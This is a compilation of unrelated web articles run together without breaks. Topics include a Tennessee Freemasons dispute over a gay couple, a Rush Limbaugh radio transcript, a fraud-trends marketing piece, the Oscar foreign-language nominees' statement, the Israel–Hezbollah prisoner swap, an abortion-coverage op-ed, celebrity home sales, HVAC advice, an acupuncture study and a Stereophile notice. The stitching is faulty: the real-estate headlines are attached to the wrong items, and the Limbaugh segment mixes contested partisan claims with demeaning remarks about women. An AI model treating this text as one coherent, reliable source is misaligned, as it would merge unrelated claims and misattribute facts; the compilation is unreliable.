Clark, is a corporate leadership trainer and Henderson is one of the county’s deputy sheriffs. The two live together on a beautiful farm outside Memphis, but the local lodge they attend in town is one of the more liberal ones that sits in a progressive neighborhood.
“We were a couple then,” Clark explained to WKNOP. “Everybody knew that we were a couple.”
When they got married just hours after the Supreme Court ruling, they posted photos of their wedding on Facebook. The Grand Lodge is the governing body of the state’s Freemasons. They eventually saw the photos and it wasn’t long before charges were brought against the men for violating the constitution’s penal code. The code requires that members not “engage in lewd conduct. To promote or engage in homosexual activity. To cohabit immorally in a situation without the benefit of marriage.” Only Tennessee and Florida Grand Lodge state chapters ban homosexuality.
Chris Hodapp, a Master Mason and author of Freemasons for Dummies explained that “overwhelmingly most Masons agree that what goes on in a Freemason’s bedroom is none of our business as a fraternity.” But what happens behind closed doors in Tennessee falls under the purview of the regulating body of the Grand Lodge.
Understandably, such a stance causes problems with recruitment for the fraternity. “When a young man hears that Masons in a state are throwing gays out or have rules against them, they just see that as the whole organization doing that and not being isolated to a particular area,” Hodapp explained.
Oddly enough the Freemasons were once a group that provided safety for those who held Enlightenment values. “It largely eliminated sectarian references and welcomed diversity. Because of that, it attracted prominent people and made an important intellectual contribution,” Paul Rich, a scholar of Freemasonry told WKNOP. “The Northern lodges are having difficulties being associated with all of this.” But Enlightenment seems to have given way to sanctioned homophobia in Tennessee.
Last November the state chapter sent out a letter to all of the local groups reminding them of their policies and informed members that their Facebook pages would all be monitored for any “unauthorized discussion” on Clark and Henderson. They also threatened that if anyone is caught engaging in such activity it would “be considered a Masonic offense and will be dealt with accordingly,”
The problem seems to have caused enough of a stir to encourage action. Next month, the state chapter will meet to elect a new Grand Master and vote on changes to the constitution including a proposed amendment to remove the ban on homosexuals as members.

Limbaugh Theorem 2.0: Trump Gets No Credit for the Economy
Aug 8, 2017
RUSH: No Russia news today. First day that I can think there is not a blockbuster of Russia news. There’s blockbuster news, and that is that Trump’s base is abandoning him and that Trump supporters are beginning to separate from him on the issues, and some in the Drive-By Media are very curious because they’re even admitting, we haven’t seen economic numbers like this in a long time, and yet Trump isn’t benefiting from it and they’re all scratching their heads wondering why.
Do you people watch the crap that you broadcast as news? You know exactly why Trump isn’t benefiting from it in your own polls. Trump is not gonna benefit in your own polls for anything. I mean, this is a constant suppression. You know, I sorry. I am gonna have to turn off these TVs. I’m just gonna have to turn off these TVs in here. There’s another woman up there that I can tell just had plastic surgery and it’s depressing and it’s distracting. I’m gonna turn ’em off. (interruption) I’m not gonna tell you that. Doesn’t matter.
Doesn’t matter who it is. You think I’m gonna say this and maybe be wrong about it. It could just be an excessive amount of makeup, but I don’t think so. It just is a distraction. The whole thing is just a distraction. I’m not even gonna tell you that.
On the Fox show it’s nothing but eight pairs of legs that you see. Who can do a program when all you see is eight pairs of legs with the skirts halfway up the thigh? Here, where is it? What do they expect us to do here?
Anyway, what I was gonna say is there’s no blockbuster on Russia but the blockbuster is how Trump’s support base is abandoning him. The Drive-Bys supposedly can’t figure out why because the economic news is unprecedentedly good, say in the last 15 years, and of course all that’s disingenuous. I’m not even convinced that they’re right, but their polling data, CNN particularly is reporting that.
BREAK TRANSCRIPT
RUSH: Remember the Limbaugh Theorem, ladies and gentlemen? The Limbaugh Theorem, for those of you new to the program, was an attempt to explain how Obama escaped accountability for all that went wrong during his administration. And the Limbaugh Theorem basically held that Obama was treated not as president. He was not seen as governing. He was seen as constantly running against a nameless, faceless group of powerful people in Washington opposing him on everything.
So when it came to immigration reform, Obama was never held responsible for anything that happened, and it was most prevalent during the economy. As the economy soured — as America’s economy stagnated, as America became an economy and nation in decline — Obama was not attached to it. The Limbaugh Theorem held that the media treated Obama — and Obama himself acted — as though he was still campaigning, and there’s this nameless, faceless bunch of people that are arrayed against poor Barack.
They’re doing everything they can to stop him, and he’s still fighting it — even though he was in charge, in between it was his policies that were having the deleterious effect. Well, I’m here today to tell you of the Limbaugh Theorem as it applies to Donald Trump. We have to make an adjustment — a variance, if you will — in the Limbaugh Theorem. In this case, the effort is to deny President Trump any accountability or responsibility for the good news that is happening in the American economy and throughout American politics and the American landscape.
Such as: The number of immigrants trying to get into the country is way, way down. Such as: The number of people on food stamps is way, way, way down. Millions of fewer people are on food stamps. The economy is growing at a rate Obama never saw. It’s almost 2.5, 2.6%. The unemployment rate continues to fall to the point now where people were asking yesterday: How much better can it get? Christopher Rugaber at the AP. In each of these instances, the Limbaugh Theorem holds that Donald Trump has nothing to do with any of it.
The way they are proving this is to suggest that even though there is undeniably great economic news and undeniably optimistic things happening, Donald Trump’s approval numbers continue to fall. Therefore, it’s automatic that Donald Trump has nothing to do with this. Because if Trump was seen as being the prime mover in all of this — goes the theory — his approval numbers would be rising and way much higher than they are now. So the Limbaugh Theorem is still in play.
Except it’s being used now to deny Trump accountability, responsibility, credit for the good things that are happening. The Limbaugh Theorem — as it applied to Obama — was to insulate and/or shield him from the damage that he was causing, and it worked. His approval numbers remained, I think, very low compared to the sycophantic news coverage he got. I mean, Obama should have been up around 70% approval, given the media coverage he got, and he was barely, barely over 50% in his second term. The media and the polling units out there are clearly doing everything they can to destroy Trump– and you’d have to say that in their minds, they are succeeding.
BREAK TRANSCRIPT
From TheHill.com: “Signs of Trouble Emerge in Trump’s Base.” This suffices as the bombshell that dropped late yesterday. “President Trump took to Twitter on Monday to boast about the strength of his base of support,” and right on time, TheHill.com has a poll telling a different story. “Trump, who is at his Bedminster, New Jersey, golf club,” which the media hates, ” lambasted the media on Monday … insisting, ‘The Trump base is far bigger & stronger than ever before (despite some phony Fake News polling).’
“As evidence, [the president] cited large crowds at rallies in states including Pennsylvania, Iowa and Ohio. But polls indicate that his base is in fact showing signs of erosion.” Funny, I remember the Drive-Bys constantly telling us their polls showing Trump was losing support during the Republican primaries too. Remember that? Every week! Every week during the primaries, they told us that Trump’s support had peaked, and then when bombshells came out — like the NBC Access Hollywood video or some other thing that Trump had supposedly done to step in it — there is polling data: “This is it! He’s gotta pull out. It’s over. Trump is finally imploding and we can see it,” and yet every week Trump’s numbers continue to increase.
Also last night, “a new CNN poll put his job approval rating at 38%. Just as worryingly from the White House’s perspective, the same survey showed his ‘strong approval’ among Republicans sliding to 59%, from 73% in February. In a Quinnipiac University poll released last week, Trump registered an overall job approval rating of just 33%,” and it said, “The president was even underwater among white people without a college education — the heart of his election-winning coalition last November — registering 43% approval and 50% disapproval with” white people without a college education.
That would… If that’s true, that means the Trump base is inverting on him. Anybody believe this? As I say, Barack Obama — with all of the fawning coverage and all of the coverage that ignored any of the things that were going wrong that never, ever attempted to attach Obama in the event with accountability or response — he should have had a 70 approval rating, and they could barely keep him above 50. Those polls, I think, are part of the silent coup that is designed to, first and foremost, paralyze Trump — and then, if they can, get rid of his presidency.
BREAK TRANSCRIPT
RUSH: This is Chris in Houston, Texas. Great to have you with us on the program. How are you doing?
CALLER: Hey, Rush. I’m doing good. Thank you for asking. I just want you to know I listen to you every day, and I consider you a friend and defend you every opportunity I get. I just wanted to say — like I told Snerdley — I’m in the petroleum-transportation business, and last year when Trump got elected —
RUSH: Hey, wait a second. Wait a sec. When you say “petroleum-transportation business,” does that mean your job is moving petroleum products and shipping them and transmitting them over the open road? You get oil and gasoline products from one place to the next?
CALLER: Yes, sir, and hazardous materials.
RUSH: Hazard…? Okay, cool. Got you. So you’re one of the guys that’s responsible for climate change —
CALLER: (laughing)
RUSH: — because you are retarding the use of renewable, clean energy by continuing to transmit this filthy, polluting stuff over the open road. Just wanted to clarify that.
CALLER: Well, Rush, I don’t believe in global warming, thanks to the knowledge that you’ve bestowed upon me and your audience. The common sense behind it all just flies in the face of their religion, as you put it. You’ve taught me so much, Rush. You really have. I wanted to tell you, my business really picked up in the last quarter of last year, which is very, very rare for my business to tick up. It usually slows down. But the economy was excited and got a shot of adrenaline when Trump got elected.
RUSH: What is your business? Why does your business slow down in the fourth quarter every year?
CALLER: Well, they’re trying to slow down production so they don’t have as much chemical on the books and have to pay taxes on it.
RUSH: Oh, I see. Okay. Yes, yes, yes, of course.
CALLER: But my main point is, you know, I never heard you say before, Rush… I want to see what you think. In ’08 — actually ’07 — I realized that Bush helped bail out the car companies, and that was kind of the beginning of a slowdown. But I really, truly believe — and it’s so obvious to me — that when Obama got elected, businesses and companies began to withdraw from the economy such as slowing their expansion and their hiring, because they weren’t sure what the rules for the economy were gonna be. You know, Obama, they weren’t sure what he was going to do, and they started to pull back. You know, with Obamacare, the different EPA regulations.
RUSH: It’s exactly right. You are exactly right. Starting, in fact, with the two months before he was inaugurated. Layoffs, people getting fired spiked. People were afraid. Look, the people we’re talking about know what liberalism does, and they knew Obama’s penchant for raising taxes and increasing government spending, and there was enough education outside to know what Obama wanted to do with health care, which is essentially have the government run it, and he was going to put that burden at first on large companies.
So there was a lot of preparing for the Obama economy by businesses trying to get rid of the easiest labor costs at first they could, which is firing people. And, by the same token, when Trump was elected, the reverse happened. When Trump was elected, following that election, businesses began to ramp up. A stock market record high was achieved yet again today, this morning. Now, the stock market…
It’s dicey if you start trying to assign specific events to explaining market activity, either up or down. But there is a belief that much of the market’s strength all year is rooted in a confidence that there is going to be significant reform in corporate tax policy. Before you even get to individual tax reform policy, there is a belief that corporate tax reform is coming with a major reduction in two rates — the capital gains rate and the corporate tax rate — and that optimism is still there.
That belief is still there. The fact that it hasn’t happened yet is not being reflected in the market slowing down. In many aspects, the U.S. economy is expanding and growing in terms of employment. What needs to happen next is wages to pick up. We’ll see if that does happen. But your theory is exactly right. I mean, there was an expectation of an expanding government that was going to be punitive to people in the private sector and businesses — even those that had supported Obama.
Crony capitalists, crony socialists, even they knew exactly what was in store. So they sidled up to Obama to try to limit the impact on them, but they started letting people go. The number of people losing their jobs was six figures. In the first two months before Obama, like 300,000, 400,000 people a month were losing their jobs, even before Obama was inaugurated.
And those decisions were validated when the first thing Obama did was that giant stimulus bill, which everybody knew was not gonna stimulate anything but the Democrat Party. That was its ultimate aim, and it worked. It stimulated the Democrat Party by stimulating union employment, and teachers and blue-collar workers and so forth. Anyway, your instincts on this are right on the money.

New data on digital fraud trends
ISMG, Longitude and Javelin research reveals what keeps security teams awake at night – and what they’re doing about it
By Ellen Joyner Roberson, CFE, Global Marketing Principal, SAS Security Intelligence Practice
Addressing the risks of convenience
Financial services firms and government agencies are evolving to meet our expectations for timeliness and convenience. Now they need to evolve how they protect themselves from the associated risks. As connectivity trends shift, so do fraud trends. For example:
New EMV chip cards make it technically unfeasible to counterfeit credit and debit cards. The downside: Fraudsters have had to switch tactics, driving a 130 percent increase in new credit card account fraud from 2014 to 2015, according to Javelin research in 2016 Digital Channel Threat Report: Derisking Convenience.
In 2015, 70 percent of new checking accounts and 80 percent of credit card accounts were opened digitally, Javelin found – a great convenience for customers. Similarly, in most states it’s easy to apply online for food assistance, health care coverage or Medicaid programs. The downside: The faceless nature of those digital interactions makes them prime to exploit, with help from static information from massive data breaches.
Few organizations are fully prepared for this changing fraud landscape, according to research by Information Security Media Group (ISMG). In Faces of Fraud: The Analytics Approach to Fraud Prevention, ISMG reported that only 34 percent of survey respondents have high confidence in their organization’s ability to detect and prevent fraud before it causes serious harm.
Sixteen percent of respondents said their anti-fraud tools and team just can’t keep pace with evolving fraud schemes. Three-quarters of them rated their anti-fraud control as only average or above average. And 37 percent said it’s usually customers who detect the fraud, not the agency or institution.
Why have traditional fraud prevention approaches fallen short? According to ISMG survey respondents, it’s because today’s fraud schemes are too sophisticated and evolve too quickly (56 percent), customers and/or partners fall for socially engineered schemes (56 percent), and so do employees (52 percent).
A trilogy of rising risks
Organizations that have not evolved their fraud defenses with the times have felt the pain in several ways.
Mounting monetary losses. According to ISMG, 41 percent of respondents have seen an increase in fraud incidents, and they are not very speedy about addressing them. More than half of respondents (52 percent) say it takes days or weeks to uncover the fraud; 15 percent don’t even know.
Sanctions and fines from regulators. Nearly one in five respondents in a survey of 120 banks say they have been fined by regulators or law enforcement in the past three years, according to Longitude Research in Combating Financial Crime: The Increasing Importance of Financial Crimes Intelligence Units in Banking. The hit is significant; 22 percent of these banks have been fined $1 billion or more.
Tarnished reputations. “Loss of reputation is a higher priority for many banks than limiting actual losses, but it is the most difficult loss to measure,” said a senior fraud and financial crimes executive interviewed by Longitude Research. In the ISMG survey, 31 percent of respondents said fraud has caused customers to close their accounts and take their business elsewhere.
What is being done – or should be?
All three research studies – from Javelin, ISMG and Longitude – found hopeful news in fraud trends as well. Financial institutions and government agencies are fighting back with stronger investigative teams, better analytical tools and more skilled staff.
Action Step: Establish a strong financial crimes investigation unit (FCIU).
Banks are stepping up their investment in FCIUs. In addition to putting more focus on financial crimes, FCIUs enable banks to collect, share and disseminate intelligence across borders, business lines and silos of risk, where ordinarily that intelligence is not shared.
According to Longitude Research on the banking industry: “The FCIU is a relatively new concept that has gained traction since the global financial crisis.” It’s encouraging to see that 82 percent of the banks surveyed have set up an FCIU or are planning to. Of these banks, 98 percent say their FCIU is a top corporate priority.
There’s still work to be done. Just 11 percent of banks say they have fully established FCIUs across all geographies and divisions. Nearly half (49 percent) said they will have a fully established FCIU within three years.
Action Step: Invest in advanced analytics.
One way leading organizations work to keep pace with fraud schemes is through advanced analytics, such as predictive models, link analysis, machine learning and anomaly detection. These technologies supplement the basic conditional logic and business rules that are commonly used today.
Few organizations are there yet. While 74 percent of respondents to the ISMG survey have implemented fraud detection and transaction monitoring systems, a closer look suggests that these technologies may be rudimentary.
More than half (54 percent) are not currently deploying advanced data and analytics tools such as behavioral analytics, predictive analytics and social media analysis (19 percent have no plans to); 45 percent said their current systems allow for only limited analytics; and 43 percent said they can’t get a consolidated view of customer activity across the enterprise. So it’s no surprise that nearly one-third of respondents say their organizations lack the technology capacity to properly detect and respond to fraud.
On the bright side, 26 percent say their organizations will invest in big data analytics. Longitude Research confirms this trend; 87 percent of respondents cited big data analytics as the leading technology tool for their bank’s FCIU. Other popular analytics tools include advanced search and discovery (80 percent), machine learning (70 percent) and unstructured data mining (70 percent).
According to The Forrester Wave™: Enterprise Fraud Management Q1 2016, machine learning is one of the key factors that “now dictate which providers lead the pack.” Investments here will undoubtedly help resolve some of the current deficiencies in fraud detection.
Action Step: Build the skills to use those analytics tools.
A bright new analytics platform won’t deliver on its promise if the users don’t have the training to use them well. Data science is the new, hot discipline, and organizations need to invest in data scientists internally or contract with third-party experts.
Where do you find them? The skills gap is real. In the ISMG study, 42 percent of respondents said their organizations lack the staff expertise – particularly data scientists who can manage the tools.
“It’s one thing to find quantitative scientists, but it’s difficult to find quantitative scientists who understand a certain government sector or commercial banking,” said David Stewart, Director of Financial Crimes Solutions at SAS. Longitude research confirms it: 71 percent of respondents report having difficulty hiring specialized talent for their FCIUs – and it’s even more difficult for small or fast-growing banks.
It’s not because they’re not looking. When they seek to hire staff members, 85 percent of banks look to existing cybersecurity professionals; 84 percent search software companies; 61 percent tap universities; and 50 percent look to the government intelligence community.
They are scouring diverse sources, but demand for analytics talent is so great that good candidates are hard to find and harder to land. Looking to boost expertise from the inside, 94 percent say combating financial crime is a top training priority, according to Longitude.
The war on fraud is gaining momentum, muscle and money
There are challenges and barriers in the war on fraud. ISMG found that two-thirds of respondents still grapple with technical constraints such as controls in different parts of the organization that don’t talk to one another. Forty-two percent don’t want to add anything that might impede the customer experience. Fair enough. Customers might say they want protections, but in practice they take their business where it’s most convenient.
Striking the delicate balance between the organization’s security and customer convenience will require a resilient and adaptable anti-fraud solution with robust analytics, backed by well-trained personnel in a well-established FCIU.
The good news is that the executive support is there, which means the dollars are there; 98 percent of respondents to the ISMG survey said they expect to see a steady or growing budget for fraud prevention in the coming year. These new funds will be invested primarily in new anti-fraud tools (65 percent) and staff training (61 percent).
Read the full reports from Javelin, ISMG and Longitude for more on fraud trends for financial and government organizations, their current security controls and gaps, and where they plan their biggest anti-fraud investments for 2017.

Oscar foreign-language nominees: ‘We refuse to think in terms of borders'
By Jeremy Kay2017-02-24T05:54:00+00:00
No comments
The six nominated directors in the best foreign-language Oscar category on Friday issued a stirring joint statement two days before the Academy Awards.
Denmark’s Martin Zandvliet, Sweden’s Hannes Holm, Iran’s Asghar Farhadi, Germany’s Maren Ade, and Martin Butler and Bentley Dean from Australia decried the wave of nationalism that has taken root in the US and may other countries.
The six filmmakers (Australia’s Tanna is directed by two people) dedicated the foreign-language Oscar – regardless of who wins on Sunday – to “all the people, artists, journalists and activists who are working to foster unity and understanding, and who uphold freedom of expression and human dignity – values whose protection is now more important than ever.”
As previously reported, Farhadi is boycotting the ceremony in protest over US president Donald Trump’s short-lived executive order banning entry to citizens from Iran, Iraq, Libya, Syria, Yemen, Sudan and Somalia.
The order has been blocked by the US courts, although Trump has said he will attempt to push through similar measures.
Farhadi has chosen two Iranians – female engineer and astronaut Anousheh Ansari and former NASA director for solar system exploration Firouz Naderi – to attend the Oscars and accept the prize on his behalf should The Salesman win.
The statement in full:
“On behalf of all nominees, we would like to express our unanimous and emphatic disapproval of the climate of fanaticism and nationalism we see today in the U.S. and in so many other countries, in parts of the population and, most unfortunately of all, among leading politicians.
“The fear generated by dividing us into genders, colors, religions and sexualities as a means to justify violence destroys the things that we depend on – not only as artists but as humans: the diversity of cultures, the chance to be enriched by something seemingly “foreign” and the belief that human encounters can change us for the better. These divisive walls prevent people from experiencing something simple but fundamental: from discovering that we are all not so different.
“So we’ve asked ourselves: What can cinema do? Although we don’t want to overestimate the power of movies, we do believe that no other medium can offer such deep insight into other people’s circumstances and transform feelings of unfamiliarity into curiosity, empathy and compassion – even for those we have been told are our enemies.
“Regardless of who wins the Academy Award for Best Foreign Language Film on Sunday, we refuse to think in terms of borders. We believe there is no best country, best gender, best religion or best color. We want this award to stand as a symbol of the unity between nations and the freedom of the arts.
“Human rights are not something you have to apply for. They simply exist – for everybody. For this reason, we dedicate this award to all the people, artists, journalists and activists who are working to foster unity and understanding, and who uphold freedom of expression and human dignity – values whose protection is now more important than ever.
“By dedicating the Oscar to them, we wish to express to them our deep respect and solidarity.
“Martin Zandvliet – Land of mine (Denmark)
Hannes Holm – A Man called Ove (Sweden)
Asghar Farhadi – The Salesman (Iran)
Maren Ade – Toni Erdmann (Germany)
Martin Butler, Bentley Dean – Tanna (Australia).”

The Israeli Cabinet's approval Sunday of a hostage swap deal with Lebanese militant group Hezbollah touched off cries of victory in Beirut and sparked a fresh round of debate within the Jewish state over the price of Israel's determination to retrieve its missing soldiers.
After weeks of emotional public speculation and a six-hour Cabinet debate, Prime Minister Ehud Olmert's government voted 22-3 in favor of a deal that would return two captured Israeli soldiers, who Olmert acknowledged publicly Sunday were probably dead.
In return for the men or their bodies, Hezbollah would receive several imprisoned Lebanese militants, the bodies of about a dozen other fighters and the release of a still-unspecified number of Palestinian prisoners.
The vote brought a triumphant response from Hezbollah's Al Manar television.
"Today, the enemy was forced to recognize the logic of the resistance," an announcer said. "Our prisoners cannot be liberated with words, diplomacy and tears. Blood liberated the land as well as the people."
At the top of the list of prisoners sought by Hezbollah is Samir Kantar, Israel's longest-held Lebanese prisoner, who is serving multiple life sentences for the murder of an Israeli father and daughter in 1979. Olmert, addressing his Cabinet, said he hoped the agreement would "bring an end to this painful episode - even at the painful price it costs us."
Just how high a price Olmert paid will be an ongoing topic of Israeli public debate. The two soldiers, Ehud Goldwasser and Eldad Regev, were captured in a July 2006 cross-border ambush that touched off a monthlong war.
Evidence has long indicated that at least one of the soldiers was gravely wounded in the attack. Unlike in the case of Cpl. Gilad Shalit, the Israeli soldier taken in southern Israel in June 2006 and still held by Hamas in the Gaza Strip, Hezbollah has offered no conclusive proof that either Regev or Goldwasser is alive. The Red Cross was never allowed to visit them.
The deal touches deep emotional chords that resonate through Israel's national psychology. The retrieval of captured soldiers is a core value in a country where military service is mandatory for most of the population.
"From our earliest days, we are taught that we do not leave men behind, wounded in the battlefield, and that we do not leave soldiers in captivity without attempting to rescue them with all our abilities and power," Olmert said Sunday.
But that national priority is balanced by a widespread belief that it would be a dangerous precedent to trade the living for the dead, which appeared to be the case here.
Israeli media reported that the soldiers or their remains would first be sent to Germany for identification, before Kantar or any of the other Lebanese prisoners are released. The process is expected to take up to two weeks.
In Lebanon, meanwhile, Al Manar showed footage of preparations for Kantar's welcome-home celebration in the southern coastal city of Sidon.
His brother, Bassem Kantar, called the swap "a historical achievement for the resistance."
Prisoner swaps
Previous Israeli-Lebanese prisoner swaps
2008: Prime Minister Ehud Olmert declares two soldiers captured by Lebanese militant group Hezbollah in 2006 to be dead. Cabinet approves deal to exchange Lebanese prisoners for bodies of the two soldiers and information on missing Israeli airman.
2004: Israel and Hezbollah guerrillas in Lebanon exchange an Israeli civilian and the bodies of three Israeli soldiers for 436 Arab prisoners and the bodies of 59 Lebanese fighters.
1996: Israel frees 65 Lebanese prisoners for the bodies of two soldiers captured in fighting in Lebanon.
1991: Israel trades 51 Lebanese prisoners for proof that one of its soldiers held in Lebanon is dead.
1985: Israel releases 1,150 Arab prisoners, almost all of them Palestinians, in return for three soldiers captured by Lebanese guerrillas in 1982.
1983: Israel swaps 4,600 Palestinian and Lebanese captives for six Israeli soldiers abducted Sept. 4, 1982, from their forward post in Lebanon. Most of the Arab prisoners had been rounded up during Israel's invasion of Lebanon.

A kinder, gentler abortion compromise
On Health Care Reform
Al Lewis
Published 4:00 am PST, Wednesday, December 2, 2009
The abortion issue threatens to drive a fatal wedge into the Democratic Senate bloc favoring health care reform, just as it nearly did in the House of Representatives. But it's possible to keep intact the strongly held principles of anti-abortion and pro-choice members of Congress and avoid a schism. The solution is a compromise - based on simple mathematics.
This observation, overlooked until now, is that abortion coverage reduces health care costs. Full-term deliveries - and complications following "back alley" procedures - cost much more than a typical abortion. Published estimates show that funding abortion coverage would probably offset as much expense as it generates. And if not, the differences would be trivial, but pennies per woman per month.
As a result, simple math dictates that an abortion rider like the one proposed by Rep. Bart Stupak, D-Mich., ought to be provided free to anyone who wants it. Why? Because the pool of insured people with abortion coverage would probably incur claims no higher than the pool without it.
Yes, both sides would say that the debate should not be about math but about principles. However, health reform is about insurance, insurance is based on math, and math is agnostic and immutable. Math trumps principles.
Even so, this compromise should please principled senators on both sides of the abortion debate who want to support health reform. The pro-choice principle is that women should not have to pay extra for abortion coverage. A no-cost rider solves that problem. The anti-abortion principle is that taxpayer money - or premium dollars paid by anti-abortion advocates - should not finance abortions. A separate risk pool solves that problem.
The logistics of a "dual pool" approach are straightforward. People would simply pick their pool when they enroll in a health plan. They could join either the pool with abortion coverage or the pool without it. No money from the second pool would cross-subsidize abortions in the first pool.
No compromise will satisfy everybody. Some who oppose abortion want to "punish" women who favor abortion by charging them extra for the rider even if the math doesn't support their position. Some pro-choice advocates don't like the idea of a "separate but equal" risk pool even if abortion coverage is free. But choice proponents need to recognize that those who oppose abortion do think abortion is a sin, and legitimately resent having to subsidize it.
Fortunately, this compromise position does not need to sway extremists in either party. Remember, passage of the health reform package in the Senate requires only a few swing votes. Therefore, a compromise needs to please only pro-choice, pro-reform Democrats repelled by the Stupak Amendment as drafted now and anti-abortion pro-reform Democrats who couldn't support legislation without it. Absent this dual-pool compromise, these lawmakers would alienate some constituents no matter how they voted.
To implement this dual-pool compromise, abortion proponents should accept the Stupak Amendment (or its Senate equivalent) as a foundation. However, they should then insist on actuarially sound premium adjustments for abortion coverage - calculations likely to show that the net added cost of offering abortion coverage essentially is zero - just as any real insurer would do. If the government is going to be an insurer, it needs to act like one.
It is not pretty to think about abortion on a spreadsheet, but, ultimately, health reform is about insurance; insurance is based on arithmetic; and arithmetic dictates that the abortion rider be "free." Despite the politics of health reform, math is not a popularity contest.

Former Heisman finalist sells in South Florida
Real estate investor Steven Roth paid $9.41 million for disgraced financier Bernard Madoff's four-bedroom beach house at 216 Old Montauk Highway in Montauk, N.Y., on Oct. 16.
Roth purchased the home from the U.S. Marshals Service, which seized the property from the now-imprisoned Madoff on July 1 in order to start to repay the victims of his Ponzi scheme.
Madoff reportedly paid $250,00 for the land in the 1980s. The 3,014-square-foot house has three baths and a grand columned porch with views of the Atlantic Ocean.
Madoff, 71, is the former chairman of the Nasdaq stock exchange and admitted operator of one of the largest investment frauds in U.S. history.
Madoff pleaded guilty to 11 felonies for a Ponzi scheme he started in the 1990s that defrauded thousands of investors of billions of dollars.
He's serving a 40-plus-year prison sentence at the Federal Correctional Complex in Butner, N.C.
Roth is the chairman of Vornado Realty Trust, a real-estate investment trust, co-founder and managing general partner of Interstate Properties, and chairman and CEO of Alexander's Inc.
Investor buys Madoff's old Hamptons home
Tim and Heather Couch sold a four-bedroom, five-bath condo at 2110 N. Ocean Blvd. in Fort Lauderdale, Fla., to Steve and Susan Wang for $1.18 million on Sept. 21.
The Couches acquired the 3,745-square-foot unit for $1.64 million in 2003.
Tim Couch was the No. 1 pick in the 1999 NFL Draft and is an analyst with the Big Blue Sports Network.
He played five NFL seasons with the Cleveland Browns, starting 59 games and throwing for 11,131 yards, 64 touchdowns and 67 interceptions.
He was cut by the team in 2004, and though he was later signed by the Green Bay Packers and Jacksonville Jaguars, he never appeared in another regular season game.
He starred at the University of Kentucky, where he was the 1998 SEC Player of the Year award and a finalist for the Heisman trophy.
Meg Ryan lists Bel-Air property
Actress Meg Ryan has listed for sale her six-bedroom, seven-bath home at 755 Stradella Road in Bel-Air (Los Angeles County), for the asking price of $14.2 million. Ryan paid $8.5 million for the 6,877-square-foot home in 2000.
Ryan, 47, is one of the best-known actresses in Hollywood with three Golden Globe nominations and a film career that dates back to the mid-1980s. Ryan is best known for her roles in "Sleepless in Seattle," "When Harry Met Sally" and "You've Got Mail."
'Dr. McDreamy' selling in Bel-Air
Actor Patrick Dempsey has listed for sale his four-bedroom, 4.5-bath at 914 Chantilly Rd. in Bel Air, Calif., for the asking price of $2.995 million. Dempsey paid $3.1 million for the 3,841-square-foot home in July 2006.
Dempsey, 43, has a career dating back to the mid 1980s when he starred in the hit teen comedy "Can't Buy Me Love," but he's best known as Dr. Derek Shepherd on ABC's "Grey's Anatomy."
He's been a mainstay on the show since its inception in 2005, earning a pair of Golden Globe nominations in 2006 and 2007 for his rendition of the often romantically conflicted "Dr. McDreamy."
He's also recently ventured back into film, including turns in the 2008 romantic comedy "Made of Honor" and the 2007 "Enchanted" with Amy Adams.

When is it Time to Replace?
When is it Time to Replace?
Certain telltale signs indicate it's time to consider replacing heating and cooling equipment, or improving the performance of your overall system. It may be time to call a professional contractor to help you make a change if:
Your heat pump or air conditioner is more than 10 years old.
Consider replacing with ENERGY STAR qualified equipment that uses 20 percent less energy than new standard models.
Your furnace or boiler is more than 15 years old.
Consider replacing with an ENERGY STAR qualified furnace, which is 15% more efficient than a conventional furnace. If you have a boiler, consider replacing with an ENERGY STAR qualified boiler that is 10% more efficient than a new, standard model.
Your equipment needs frequent repairs and your energy bills are going up.
Your cooling or heating equipment my have become less efficient.
Some rooms in your home are too hot or too cold.
Improper equipment operation, duct problems or inadequate insulation could be the cause.
No one is home for long periods of the day and you do not have a programmable thermostat.
Install an ENERGY STAR qualified programmable thermostat or have a good contractor install one and instruct you on its use — to start saving energy and money while they're away or sleeping.
Your home has humidity problems.
Poor equipment operation, inadequate equipment, and leaky ductwork can cause the air to be too dry in the winter or too humid in the summer.
Your home has excessive dust.
Leaky ducts can pull particles and air from attics, crawl spaces and basements and distribute them throughout your house. Sealing your ducts may be a solution.
Your heating or cooling system is noisy.
You could have an undersized duct system or a problem with the indoor coil of your cooling equipment.

Acupuncture Relieves Pain in Largest Study of Treatment
Nicole Ostrow
Bloomberg News

Acupuncture, an ancient Chinese therapy that inserts needles into the body, reduced back and neck pain, arthritis and headaches, according to the largest analysis of the treatment.
Data compiled from 29 studies of almost 18,000 people found that acupuncture was better at relieving pain than not having the treatment at all or undergoing a sham procedure, according to research reported in the Archives of Internal Medicine today.
About 3 million U.S. adults get acupuncture each year, mostly for chronic pain, the authors wrote. Doctors don't know why the ancient Chinese therapy can help relieve pain and more studies are needed to determine how the treatment fits with remedies such as drugs, surgery and physical and behavioral therapy, said Andrew Vickers, the lead author of the analysis.
"We thought for a long time that the reason why acupuncture worked was just because people believed it work," Vickers, a researcher at Memorial Sloan-Kettering Cancer Center in New York, said in a Sept. 7 telephone interview. "We now know that the effect of acupuncture goes above and beyond the placebo effect. Acupuncture is a reasonable option for chronic pain."
Traditional Chinese medicine explains acupuncture as a technique for balancing the flow of energy in a person's body, according to the Mayo Clinic. Inserting needles into specific points along pathways in the body changes the flow.
Pressure Points
In contrast, many Western practitioners view the acupuncture points as places to stimulate nerves, muscles and connective tissue to boost blood flow and the body's natural painkillers, the Mayo Clinic said on its website.
Researchers looked at data from 17,922 patients in trials in the U.S. and Europe that measured acupuncture's effect on chronic pain. The trials compared acupuncture with patients who had no treatment or those who had a procedure that faked acupuncture by putting the needles into the body in different places and depths than usual.
The findings mean in real terms that about half of patients receiving acupuncture would have a 50 percent or more reduction in their pain compared with 30 percent in the no treatment group and about 43 percent having fake acupuncture.
The difference between treatment and sham acupuncture may be more modest because people feel better if they think they are getting the real therapy or putting any needle in the body may have some positive effect, Vickers said.
Andrew Avins, who wrote an accompanying editorial, said today's findings are important for those with chronic pain.
"For patients who are inclined to try acupuncture for a chronic pain condition, I would certainly support their interest, assuming that they have appropriate insurance coverage or the resources to readily pay for the treatment," Avins, a scientist in the Division of Research for Kaiser Permanente, an Oakland, California-based health plan, said in an e-mail. "I would also encourage patients to take advantage of all conventional interventions" to treat their pain, he said.

Stereophile: the Next Generation
Stereophile Staff | Mar 1, 2019
Today, Stereophile announces its first major Editorial changes in decades, with an expansion of the Editorial team and a change in leadership.
